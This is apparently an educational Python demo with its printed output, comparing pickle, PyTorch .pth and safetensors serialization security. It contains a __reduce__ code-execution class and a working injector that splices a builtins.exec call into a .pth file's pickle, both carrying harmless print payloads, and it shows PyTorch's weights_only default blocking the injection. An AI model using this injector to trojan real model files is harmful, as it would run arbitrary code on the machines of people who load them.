"""
Comprehensive Demo: Security Implications of Model Serialization Formats
========================================================================
This demo compares:
1. Standard Pickle (unsafe) - .pkl files
2. PyTorch Pickle (with modern security features) - .pth files
3. Safetensors (safe) - .safetensors files
"""

import pickle
import random
import torch
import torch.nn as nn
import torchvision.models as models
import zipfile
import struct
from pathlib import Path
import json
from safetensors.torch import save_file, load_file
import warnings
warnings.filterwarnings('ignore')

# ============================================================================
# PART 1: Basic Pickle Security Demo
# ============================================================================

print("="*80)
print("PART 1: Pickle Security Demonstration")
print("="*80)

# Generate random tabular data
tabular_data = [
    {
        "id": i,
        "name": f"Item-{i}",
        "value": random.randint(1, 100),
        "category": random.choice(['A', 'B', 'C'])
    }
    for i in range(1, 6)
]

print("\n1.1 Creating safe pickle file with regular data...")
with open('safe_data.pkl', 'wb') as f:
    pickle.dump(tabular_data, f)

# Load and verify safe data
print("Loading safe pickle file:")
with open('safe_data.pkl', 'rb') as f:
    safe_data = pickle.load(f)
print(f"Safe data loaded: {safe_data[0]} ...")  # Show first item

# Malicious class that executes code during deserialization
print("\n1.2 Creating malicious pickle payload...")
class Malicious:
    def __reduce__(self):
        # This code executes DURING deserialization
        return (print, ("⚠️  WARNING: Malicious code execution during unpickling!",))

# Create malicious payload
malicious_payload = Malicious()

# Create file with mixed content (safe data + malicious code)
print("Creating mixed pickle file (safe data + malicious code)...")
with open('malicious_data.pkl', 'wb') as f:
    pickle.dump([tabular_data, malicious_payload], f)

# Demonstrate the security issue
print("\n1.3 Loading the malicious pickle file (UNSAFE!):")
print("The following message appears BEFORE the data is returned:")
with open('malicious_data.pkl', 'rb') as f:
    data = pickle.load(f)

print("\nLoaded data structure (notice the malicious object):")
for i, item in enumerate(data):
    print(f"  Item {i}: {type(item)}")

# ============================================================================
# PART 2: PyTorch .pth File Security - Modern PyTorch (2.6+)
# ============================================================================

print("\n" + "="*80)
print("PART 2: PyTorch .pth File Security - Modern PyTorch (2.6+)")
print("="*80)

print("\n2.1 PyTorch version:", torch.__version__)
print("Note: PyTorch 2.6+ defaults to weights_only=True for security!")

class PthCodeInjector:
    """Demonstrates how code could be injected into PyTorch .pth files"""

    def __init__(self, filepath: str):
        self.filepath = Path(filepath)

    def inject_payload(self, code: str, output_path: str):
        """Inject Python code into the pickle file within a .pth (ZIP) file"""
        # Read original pickle from zip
        with zipfile.ZipFile(self.filepath, "r") as zip_ref:
            data_pkl_path = next(name for name in zip_ref.namelist() if name.endswith("/data.pkl"))
            pickle_data = zip_ref.open(data_pkl_path).read()

        # Find insertion point after protocol bytes
        i = 2  # Skip PROTO opcode and version byte

        # Create exec sequence with protocol 4 pickle opcodes
        exec_sequence = (
            b'c' + b'builtins\nexec\n' +  # GLOBAL opcode + module + attr
            b'(' +  # MARK opcode
            b'\x8c' + struct.pack('<B', len(code)) + code.encode('utf-8') +  # SHORT_BINUNICODE
            b't' +  # TUPLE
            b'R'    # REDUCE
        )

        # Insert exec sequence after protocol bytes
        modified_pickle = pickle_data[:i] + exec_sequence + pickle_data[i:]

        # Write modified pickle back to zip
        with zipfile.ZipFile(output_path, 'w') as new_zip:
            with zipfile.ZipFile(self.filepath, 'r') as orig_zip:
                for item in orig_zip.infolist():
                    if item.filename.endswith('/data.pkl'):
                        new_zip.writestr(item.filename, modified_pickle)
                    else:
                        new_zip.writestr(item.filename, orig_zip.open(item).read())

print("\n2.2 Creating original MobileNet model...")
torch.manual_seed(42)
model = models.mobilenet_v2(weights=None)  # No pretrained weights for demo
model.eval()
# Save with pickle protocol
torch.save(model, "mobilenet.pth")
print("Original model saved as 'mobilenet.pth'")

# Test original model
test_input = torch.randn(1, 3, 224, 224)
original_output = model(test_input)

print("\n2.3 Injecting potential malicious code into .pth file...")
modifier = PthCodeInjector("mobilenet.pth")
modifier.inject_payload(
    "print('⚠️  This would execute in older PyTorch versions!')",
    "modified_mobilenet.pth"
)
print("Modified model saved as 'modified_mobilenet.pth'")

# Demonstrate modern PyTorch security
print("\n2.4 Loading modified .pth file with modern PyTorch (SECURE default):")
print("Attempting torch.load() with default weights_only=True...")
try:
    modified_model = torch.load("modified_mobilenet.pth")
    print("This shouldn't print in PyTorch 2.6+!")
except Exception as e:
    print(f"✓ SECURITY BLOCKED: {type(e).__name__}")
    print("  PyTorch prevented arbitrary code execution!")
    print(f"  Error: {str(e).split('.')[0]}...")

print("\n2.5 Safe way to load with custom globals (if absolutely necessary):")
print("Using torch.serialization.safe_globals context manager:")
from torch.serialization import safe_globals

# This is how you'd load a custom model safely
class SimpleModel(nn.Module):
    def __init__(self):
        super(SimpleModel, self).__init__()
        self.fc1 = nn.Linear(10, 50)
        self.fc2 = nn.Linear(50, 2)

    def forward(self, x):
        x = torch.relu(self.fc1(x))
        return self.fc2(x)

# Save a custom model
custom_model = SimpleModel()
torch.save(custom_model, "custom_model.pth")

# Load it safely with allowlist
print("\n  Loading custom model with safe_globals:")
try:
    with safe_globals([SimpleModel]):
        loaded_custom = torch.load("custom_model.pth", weights_only=True)
    print("  ✓ Successfully loaded custom model with allowlist")
except Exception as e:
    print(f"  Error: {e}")

# ============================================================================
# PART 3: Safetensors - The Safe Alternative
# ============================================================================

print("\n" + "="*80)
print("PART 3: Safetensors - The Safe Alternative")
print("="*80)

print("\n3.1 Creating a simple PyTorch model...")
model = SimpleModel()
example_input = torch.randn(1, 10)
output = model(example_input)

print("\n3.2 Saving model weights with Safetensors (SAFE format)...")
weights = model.state_dict()
save_file(weights, "model.safetensors")
print("Weights saved to 'model.safetensors'")

# Let's try to inspect what's in a safetensors file
print("\n3.3 Inspecting safetensors file contents:")
with open("model.safetensors", "rb") as f:
    safetensors_data = f.read()
    # Safetensors has a header with metadata, then raw tensor data
    header_size = struct.unpack('<Q', safetensors_data[:8])[0]
    header_json = safetensors_data[8:8+header_size].decode('utf-8')
    header = json.loads(header_json)

print(f"Header metadata (no executable code):")
for tensor_name, tensor_info in header.items():
    print(f"  - {tensor_name}: shape {tensor_info['shape']}, dtype {tensor_info['dtype']}")

print("\n3.4 Loading weights from safetensors (SAFE)...")
loaded_weights = load_file("model.safetensors")
model.load_state_dict(loaded_weights)

print("3.5 Verifying model still works:")
output_after = model(example_input)
print(f"Model output after loading: {output_after[0].detach().numpy()}")
print(f"Output matches original: {torch.allclose(output, output_after)}")

# ============================================================================
# PART 4: Printing Model Weights and Comparison
# ============================================================================

print("\n" + "="*80)
print("PART 4: Model Weights and Comparison")
print("="*80)

def print_model_weights(model, model_name, num_samples=3):
    """Print sample weights from a model"""
    print(f"\n{model_name} weights (first {num_samples} values):")
    total_params = 0
    for name, param in model.named_parameters():
        if param.requires_grad:
            flat_params = param.data.flatten()
            sample_values = flat_params[:min(num_samples, len(flat_params))].cpu().numpy()
            # Format for better readability
            formatted_values = [f"{x:.4f}" for x in sample_values]
            print(f"  {name}: shape {tuple(param.shape)}, first values: {formatted_values}")
            total_params += param.numel()
    print(f"  Total parameters: {total_params:,}")

print("\n4.1 SimpleModel weights:")
print_model_weights(model, "SimpleModel")

print("\n4.2 MobileNet model weights (summary):")
mobile_model = models.mobilenet_v2(weights=None)
total_params = sum(p.numel() for p in mobile_model.parameters())
print(f"  Total MobileNet parameters: {total_params:,}")
print("  (Full weights omitted for brevity - see previous output for details)")

# ============================================================================
# PART 5: Security Best Practices Demonstration
# ============================================================================

print("\n" + "="*80)
print("PART 5: Security Best Practices")
print("="*80)

print("\n5.1 Modern PyTorch loading options:")
print("  • torch.load(..., weights_only=True) - DEFAULT (SECURE)")
print("    - Only allows built-in PyTorch tensors and basic types")
print("    - Blocks arbitrary code execution")
print("    - Recommended for most use cases")
print("\n  • torch.load(..., weights_only=False) - UNSAFE")
print("    - Allows arbitrary code execution")
print("    - Only use with TRUSTED files")
print("    - Equivalent to old PyTorch behavior")
print("\n  • torch.serialization.safe_globals() context manager")
print("    - Allowlist specific classes when needed")
print("    - Example: loading custom model classes")
print("    - More secure than weights_only=False")

print("\n5.2 Comparing file formats for security:")
comparison = [
    {"Format": ".pkl (Pickle)", "Safety": "❌ Unsafe", "Executable Code": "Yes", "Default Protection": "None"},
    {"Format": ".pth (PyTorch pre-2.6)", "Safety": "❌ Unsafe", "Executable Code": "Yes", "Default Protection": "None"},
    {"Format": ".pth (PyTorch 2.6+)", "Safety": "⚠️  Safe by default", "Executable Code": "Blocked", "Default Protection": "weights_only=True"},
    {"Format": ".safetensors", "Safety": "✅ Safe", "Executable Code": "No", "Default Protection": "Format-level"},
]

try:
    from tabulate import tabulate
    print(tabulate(comparison, headers="keys", tablefmt="grid"))
except ImportError:
    print("\nFormat Comparison:")
    for item in comparison:
        print(f"  {item['Format']}: {item['Safety']} - {item['Default Protection']}")

print("\n5.3 Recommendations:")
print("  ✅ Use safetensors for model weights when possible")
print("  ✅ Keep PyTorch updated (2.6+ for security features)")
print("  ✅ Use torch.load() with default weights_only=True")
print("  ✅ Prefer saving/loading state_dict with safetensors over full models")
print("  ⚠️  Never set weights_only=False with untrusted files")
print("  ⚠️  Even with allowlists, be careful with pickle-based formats")
print("  📦 Consider ONNX for model interchange between frameworks")

# ============================================================================
# PART 6: Practical Safe Model Loading
# ============================================================================

print("\n" + "="*80)
print("PART 6: Practical Safe Model Loading")
print("="*80)

print("\n6.1 Recommended safe workflows:")

# Method 1: State dict with safetensors (SAFEST)
print("\n  ✅ Method 1: State dict + safetensors (SAFEST)")
# Save state dict as safetensors
save_file(model.state_dict(), "model_state.safetensors")
print("  • Saved model state dict to 'model_state.safetensors'")
# Load and apply
loaded_state = load_file("model_state.safetensors")
new_model = SimpleModel()
new_model.load_state_dict(loaded_state)
print("  • Loaded state dict from safetensors: ✓ Safe (no code execution possible)")

# Method 2: State dict with torch.save (weights_only=True)
print("\n  ✅ Method 2: State dict + torch.save (weights_only=True)")
torch.save(model.state_dict(), "model_state.pth")
loaded_state = torch.load("model_state.pth", weights_only=True)
new_model = SimpleModel()
new_model.load_state_dict(loaded_state)
print("  • Loaded state dict with weights_only=True: ✓ Safe (tensors only)")

# Method 3: Full model with allowlist (if custom classes needed)
print("\n  ⚠️  Method 3: Full model with safe_globals (for custom classes)")
torch.save(custom_model, "custom_model.pth")
try:
    with safe_globals([SimpleModel]):
        loaded_custom = torch.load("custom_model.pth", weights_only=True)
    print("  • Loaded custom model with allowlist: ✓ Safe (restricted)")
except Exception as e:
    print(f"  • Error: {e}")

# Method 4: What NOT to do
print("\n  ❌ Method 4: What NOT to do (UNSAFE)")
print("  • torch.load(..., weights_only=False) - NEVER use with untrusted files")
print("  • Loading full models without allowlists from untrusted sources")

# ============================================================================
# PART 7: Cleanup
# ============================================================================

print("\n" + "="*80)
print("PART 7: Generated Files")
print("="*80)

import os

files_generated = [
    'safe_data.pkl',
    'malicious_data.pkl',
    'mobilenet.pth',
    'modified_mobilenet.pth',
    'custom_model.pth',
    'model.safetensors',
    'model_state.pth',
    'model_state.safetensors'
]

print("\nFiles created during this demo:")
for file in files_generated:
    if os.path.exists(file):
        size = os.path.getsize(file)
        print(f"  • {file} ({size} bytes)")

print("\n" + "="*80)
print("DEMO COMPLETE - Security Evolution Demonstrated")
print("="*80)

print("\n🔒 KEY TAKEAWAYS:")
print("  • PyTorch 2.6+ now protects against pickle-based attacks by default")
print("  • Safetensors remains the safest option (no executable code at all)")
print("  • For custom classes, use safe_globals context manager with weights_only=True")
print("  • State dict + safetensors is the recommended workflow")
print("  • Never use weights_only=False with untrusted files")
print("\n⚠️  REMINDER: Even with protections, be cautious with files from untrusted sources!")

"""
================================================================================
PART 1: Pickle Security Demonstration
================================================================================

1.1 Creating safe pickle file with regular data...
Loading safe pickle file:
Safe data loaded: {'id': 1, 'name': 'Item-1', 'value': 50, 'category': 'A'} ...

1.2 Creating malicious pickle payload...
Creating mixed pickle file (safe data + malicious code)...

1.3 Loading the malicious pickle file (UNSAFE!):
The following message appears BEFORE the data is returned:
⚠️  WARNING: Malicious code execution during unpickling!

Loaded data structure (notice the malicious object):
  Item 0: <class 'list'>
  Item 1: <class 'NoneType'>

================================================================================
PART 2: PyTorch .pth File Security - Modern PyTorch (2.6+)
================================================================================

2.1 PyTorch version: 2.10.0+cpu
Note: PyTorch 2.6+ defaults to weights_only=True for security!

2.2 Creating original MobileNet model...
Original model saved as 'mobilenet.pth'

2.3 Injecting potential malicious code into .pth file...
Modified model saved as 'modified_mobilenet.pth'

2.4 Loading modified .pth file with modern PyTorch (SECURE default):
Attempting torch.load() with default weights_only=True...
✓ SECURITY BLOCKED: UnpicklingError
  PyTorch prevented arbitrary code execution!
  Error: Weights only load failed...

2.5 Safe way to load with custom globals (if absolutely necessary):
Using torch.serialization.safe_globals context manager:

  Loading custom model with safe_globals:
  Error: Weights only load failed. This file can still be loaded, to do so you have two options, do those steps only if you trust the source of the checkpoint. 
    (1) In PyTorch 2.6, we changed the default value of the `weights_only` argument in `torch.load` from `False` to `True`. Re-running `torch.load` with `weights_only` set to `False` will likely succeed, but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.
    (2) Alternatively, to load with `weights_only=True` please check the recommended steps in the following error message.
    WeightsUnpickler error: Unsupported global: GLOBAL torch.nn.modules.linear.Linear was not an allowed global by default. Please use `torch.serialization.add_safe_globals([torch.nn.modules.linear.Linear])` or the `torch.serialization.safe_globals([torch.nn.modules.linear.Linear])` context manager to allowlist this global if you trust this class/function.

Check the documentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/generated/torch.load.html.

================================================================================
PART 3: Safetensors - The Safe Alternative
================================================================================

3.1 Creating a simple PyTorch model...

3.2 Saving model weights with Safetensors (SAFE format)...
Weights saved to 'model.safetensors'

3.3 Inspecting safetensors file contents:
Header metadata (no executable code):
  - fc1.bias: shape [50], dtype F32
  - fc1.weight: shape [50, 10], dtype F32
  - fc2.bias: shape [2], dtype F32
  - fc2.weight: shape [2, 50], dtype F32

3.4 Loading weights from safetensors (SAFE)...
3.5 Verifying model still works:
Model output after loading: [ 0.26924106 -0.2856136 ]
Output matches original: True

================================================================================
PART 4: Model Weights and Comparison
================================================================================

4.1 SimpleModel weights:

SimpleModel weights (first 3 values):
  fc1.weight: shape (50, 10), first values: ['0.1170', '0.1905', '0.0675']
  fc1.bias: shape (50,), first values: ['0.1737', '0.0381', '0.2165']
  fc2.weight: shape (2, 50), first values: ['0.0779', '0.0907', '0.0857']
  fc2.bias: shape (2,), first values: ['0.0713', '-0.0241']
  Total parameters: 652

4.2 MobileNet model weights (summary):
  Total MobileNet parameters: 3,504,872
  (Full weights omitted for brevity - see previous output for details)

================================================================================
PART 5: Security Best Practices
================================================================================

5.1 Modern PyTorch loading options:
  • torch.load(..., weights_only=True) - DEFAULT (SECURE)
    - Only allows built-in PyTorch tensors and basic types
    - Blocks arbitrary code execution
    - Recommended for most use cases

  • torch.load(..., weights_only=False) - UNSAFE
    - Allows arbitrary code execution
    - Only use with TRUSTED files
    - Equivalent to old PyTorch behavior

  • torch.serialization.safe_globals() context manager
    - Allowlist specific classes when needed
    - Example: loading custom model classes
    - More secure than weights_only=False

5.2 Comparing file formats for security:
+------------------------+---------------------+-------------------+----------------------+
| Format                 | Safety              | Executable Code   | Default Protection   |
+========================+=====================+===================+======================+
| .pkl (Pickle)          | ❌ Unsafe           | Yes               | None                 |
+------------------------+---------------------+-------------------+----------------------+
| .pth (PyTorch pre-2.6) | ❌ Unsafe           | Yes               | None                 |
+------------------------+---------------------+-------------------+----------------------+
| .pth (PyTorch 2.6+)    | ⚠️  Safe by default | Blocked           | weights_only=True    |
+------------------------+---------------------+-------------------+----------------------+
| .safetensors           | ✅ Safe             | No                | Format-level         |
+------------------------+---------------------+-------------------+----------------------+

5.3 Recommendations:
  ✅ Use safetensors for model weights when possible
  ✅ Keep PyTorch updated (2.6+ for security features)
  ✅ Use torch.load() with default weights_only=True
  ✅ Prefer saving/loading state_dict with safetensors over full models
  ⚠️  Never set weights_only=False with untrusted files
  ⚠️  Even with allowlists, be careful with pickle-based formats
  📦 Consider ONNX for model interchange between frameworks

================================================================================
PART 6: Practical Safe Model Loading
================================================================================

6.1 Recommended safe workflows:

  ✅ Method 1: State dict + safetensors (SAFEST)
  • Saved model state dict to 'model_state.safetensors'
  • Loaded state dict from safetensors: ✓ Safe (no code execution possible)

  ✅ Method 2: State dict + torch.save (weights_only=True)
  • Loaded state dict with weights_only=True: ✓ Safe (tensors only)

  ⚠️  Method 3: Full model with safe_globals (for custom classes)
  • Error: Weights only load failed. This file can still be loaded, to do so you have two options, do those steps only if you trust the source of the checkpoint. 
    (1) In PyTorch 2.6, we changed the default value of the `weights_only` argument in `torch.load` from `False` to `True`. Re-running `torch.load` with `weights_only` set to `False` will likely succeed, but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.
    (2) Alternatively, to load with `weights_only=True` please check the recommended steps in the following error message.
    WeightsUnpickler error: Unsupported global: GLOBAL torch.nn.modules.linear.Linear was not an allowed global by default. Please use `torch.serialization.add_safe_globals([torch.nn.modules.linear.Linear])` or the `torch.serialization.safe_globals([torch.nn.modules.linear.Linear])` context manager to allowlist this global if you trust this class/function.

Check the documentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/generated/torch.load.html.

  ❌ Method 4: What NOT to do (UNSAFE)
  • torch.load(..., weights_only=False) - NEVER use with untrusted files
  • Loading full models without allowlists from untrusted sources

================================================================================
PART 7: Generated Files
================================================================================

Files created during this demo:
  • safe_data.pkl (178 bytes)
  • malicious_data.pkl (270 bytes)
  • mobilenet.pth (14296715 bytes)
  • modified_mobilenet.pth (14271854 bytes)
  • custom_model.pth (5967 bytes)
  • model.safetensors (2888 bytes)
  • model_state.pth (5061 bytes)
  • model_state.safetensors (2888 bytes)

================================================================================
DEMO COMPLETE - Security Evolution Demonstrated
================================================================================

🔒 KEY TAKEAWAYS:
  • PyTorch 2.6+ now protects against pickle-based attacks by default
  • Safetensors remains the safest option (no executable code at all)
  • For custom classes, use safe_globals context manager with weights_only=True
  • State dict + safetensors is the recommended workflow
  • Never use weights_only=False with untrusted files

⚠️  REMINDER: Even with protections, be cautious with files from untrusted sources!

"""